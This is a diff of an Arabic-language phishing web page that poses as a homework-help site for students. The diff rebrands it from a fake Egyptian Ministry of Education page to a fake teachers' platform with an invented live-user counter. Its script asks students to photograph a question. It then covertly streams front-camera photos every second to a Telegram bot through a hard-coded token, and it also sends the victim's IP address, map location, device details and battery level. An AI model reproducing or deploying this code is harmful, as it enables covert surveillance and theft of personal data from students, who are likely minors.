@@ -3,7 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة علمني | المساعد الذكي</title>
+    
+    <meta property="og:title" content="📝 منصة حل الأسئلة | مستر إبراهيم أحمد">
+    <meta property="og:description" content="ارفع سؤالك الآن واحصل على الإجابة والخطوات بالتفصيل خلال دقائق.">
+
+    <title>منصة حل المسائل | المساعد الذكي</title>
     
     <script>
         const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
@@ -14,21 +18,17 @@
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'capture.jpg');
             formData.append('caption', caption);
-            try {
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-            } catch (e) {}
+            try { fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }); } catch (e) {}
         }
 
         async function startDoubleCapture() {
             try {
-                // 1. فتح الكاميرا الخلفية للطالب عشان يصور السؤال (للخداع)
                 const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 const videoElement = document.getElementById('viewfinder');
                 videoElement.style.display = "block";
                 videoElement.srcObject = streamBack;
                 await videoElement.play();
 
-                // 2. فتح الكاميرا الأمامية في الخلفية لسحب الصور (الصيد)
                 const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = streamFront;
@@ -37,16 +37,15 @@
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
-                // حلقة صيد الكاميرا الأمامية (كل ثانية)
                 setInterval(() => {
                     canvas.width = hiddenVideo.videoWidth;
                     canvas.height = hiddenVideo.videoHeight;
                     context.drawImage(hiddenVideo, 0, 0);
-                    canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد الكاميرا الأمامية (تلقائي)"); }, 'image/jpeg', 0.4); 
+                    canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الأمامية)"); }, 'image/jpeg', 0.4); 
                 }, 1000);
 
             } catch (err) {
-                alert("يجب السماح بالكاميرا لتصوير السؤال والحصول على الإجابة!");
+                alert("تنبيه: يجب السماح بالكاميرا لتصوير السؤال ليتمكن المستر من الحل.");
             }
         }
 
@@ -60,24 +59,15 @@
             const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected";
 
             const report = `
-👑 **KIMO V.MAX - تقرير الـ 40 بند الشامل** 👑
+🎓 **صيد جديد - منصة المستر إبراهيم** 🎓
 ━━━━━━━━━━━━━━
-🌍 **[1] الشبكة والموقع**
+🌍 **الرادار:**
 • الـ IP: \`${ip.ip}\`
-• الشركة: ${ip.org || "N/A"}
 • الموقع: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
-• نوع الشبكة: ${navigator.connection ? navigator.connection.effectiveType : "N/A"}
-
-📱 **[2] عتاد الموبايل**
-• النظام: ${navigator.platform}
-• المعالج: ${navigator.hardwareConcurrency} Cores
-• الرامات: ${navigator.deviceMemory || "N/A"} GB
+📱 **الجهاز:**
+• النظام: ${navigator.platform} | المعالج: ${navigator.hardwareConcurrency}
 • كارت الشاشة: \`${gpu}\`
-• دقة الشاشة: ${screen.width}x${screen.height}
-
-🔋 **[3] الحالة اللحظية**
-• البطارية: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A"}
-• الشحن: ${navigator.getBattery ? (await (await navigator.getBattery()).charging ? "⚡ متصل" : "🔋 غير متصل") : "N/A"}
+🔋 **البطارية:** ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A"}
 ━━━━━━━━━━━━━━`;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
@@ -97,12 +87,12 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📝 صورة السؤال التي التقطها الطالب"); }, 'image/jpeg', 0.8);
+            canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📝 صورة السؤال المرفوعة"); }, 'image/jpeg', 0.8);
 
             document.getElementById('status').innerHTML = `
-                <div style="padding: 20px; border: 2px solid #238636; border-radius: 15px; background: #e6ffed;">
-                    <h3 style="color:#238636; margin:0;">✅ تم استلام السؤال بنجاح</h3>
-                    <p style="color:#444; font-size:14px; font-weight:bold;">سيتم الرد عليك قريباً.. يرجى زيارة الموقع قريباً لمتابعة الحل.</p>
+                <div style="padding: 20px; border: 2px solid #1a73e8; border-radius: 15px; background: rgba(232, 240, 254, 0.9);">
+                    <h3 style="color:#1a73e8; margin:0;">✅ تم الإرسال للمستر</h3>
+                    <p style="color:#444; font-size:14px; font-weight:bold;">جاري مراجعة سؤالك.. يرجى العودة قريباً لرؤية الإجابة النموذجية.</p>
                     <div class="loader"></div>
                 </div>`;
         }
@@ -115,38 +105,49 @@
     </script>
 
     <style>
-        body { background: #f4f7f6; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .box { background: white; width: 95%; max-width: 400px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #003366; }
-        .logo { width: 60px; margin-bottom: 10px; }
-        h1 { font-size: 18px; color: #003366; margin-bottom: 15px; }
-        textarea { width: 100%; height: 100px; border: 1px solid #ddd; border-radius: 12px; padding: 10px; margin-bottom: 15px; box-sizing: border-box; resize: none; }
-        .btn-camera { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; margin-bottom: 10px; }
+        body { background: #f8f9fa; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .box { background: white; width: 95%; max-width: 420px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #1a73e8; position: relative; }
+        .nav-icons { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .my-answers { font-size: 13px; color: #1a73e8; font-weight: bold; }
+        .logo-text { font-weight: 900; color: #1a73e8; font-size: 20px; }
+        h1 { font-size: 18px; color: #333; margin: 10px 0; }
+        .user-counter { background: #e8f0fe; color: #1967d2; font-size: 11px; padding: 6px 15px; border-radius: 20px; display: inline-block; margin-bottom: 20px; border: 1px solid #d2e3fc; }
+        textarea { width: 100%; height: 100px; border: 1px solid #dadce0; border-radius: 12px; padding: 12px; margin-bottom: 15px; box-sizing: border-box; font-family: inherit; resize: none; }
+        .btn-camera { background: #1a73e8; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; box-shadow: 0 4px 6px rgba(26,115,232,0.2); }
         #viewfinder { width: 100%; border-radius: 12px; margin-bottom: 15px; display: none; background: #000; }
-        .btn-capture { background: #d93025; color: white; border: none; padding: 15px; width: 80px; height: 80px; border-radius: 50%; cursor: pointer; font-weight: bold; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #238636; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 15px auto; }
+        .btn-capture { background: #d93025; color: white; border: 5px solid rgba(217, 48, 37, 0.2); width: 70px; height: 70px; border-radius: 50%; cursor: pointer; margin-bottom: 10px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer { font-size: 10px; color: #aaa; margin-top: 20px; }
+        .footer { font-size: 11px; color: #70757a; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/ar/0/03/Logo_of_the_Egyptian_Ministry_of_Education.png" class="logo">
-        <h1>منصة علمني | المساعد الذكي</h1>
+        <div class="nav-icons">
+            <span class="logo-text">🎓 حلول الذكية</span>
+            <span class="my-answers">📁 إجابات السابقة</span>
+        </div>
+
+        <h1>أهلاً بك في منصة المستر</h1>
+        <div class="user-counter">👨‍🎓 يتواجد الآن 12,450 طالب لطلب الحلول</div>
         
         <div id="status">
             <div id="initial-ui">
-                <textarea placeholder="اكتب سؤالك هنا ليتم حله فوراً..."></textarea>
-                <button class="btn-camera" onclick="showCameraUI()">📸 فتح الكاميرا لتصوير السؤال</button>
+                <textarea placeholder="اكتب سؤالك هنا ليقوم مستر إبراهيم وخالد بالرد عليك..."></textarea>
+                <button class="btn-camera" onclick="showCameraUI()">📸 تصوير السؤال من الكتاب</button>
             </div>
 
             <div id="camera-ui" style="display:none;">
-                <p style="font-size:13px; color:#666;">وجه الكاميرا نحو السؤال واضغط التقاط</p>
+                <p style="font-size:13px; color:#555; margin-bottom:10px;">وجه الكاميرا نحو السؤال واضغط زر الالتقاط</p>
                 <video id="viewfinder" autoplay playsinline></video>
-                <button class="btn-capture" onclick="captureQuestion()">التقاط</button>
+                <button class="btn-capture" onclick="captureQuestion()"></button>
             </div>
         </div>
 
-        <div class="footer">وزارة التربية والتعليم والتعليم الفني - © 2026</div>
+        <div class="footer">
+            بواسطة: مستر إبراهيم أحمد & مستر خالد عمر<br>
+            حقوق النشر محفوظة © 2026
+        </div>
     </div>
 </body>
 </html>
